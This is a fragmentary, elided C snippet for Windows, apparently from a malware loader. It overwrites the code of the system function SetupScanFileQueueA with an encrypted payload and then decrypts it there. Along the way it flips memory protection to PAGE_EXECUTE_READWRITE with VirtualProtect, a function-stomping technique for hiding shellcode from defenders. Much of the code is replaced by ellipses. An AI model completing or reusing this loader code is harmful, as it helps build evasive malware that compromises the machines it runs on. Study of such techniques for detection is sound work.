...
BOOL WritePayload(PVOID pAddress, PBYTE pPayload, SIZE_T sPayloadSize) {
	...
	if (!VirtualProtect(pAddress, 464, PAGE_READWRITE, &dwOldProtection)){
	...
	if (!VirtualProtect(pAddress, 464, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
...
int main() {
	...
	if (!WritePayload(&SetupScanFileQueueA, Bytes, Size)) {
		return -1;
	}
	printf("[+] DONE \n");
	...
	// decryption
	if (!SimpleDecryption(&SetupScanFileQueueA, (DWORD)Size, pKey, pIv, &pPlaintext, &dwPlainSize)) {
		return -1;
	}
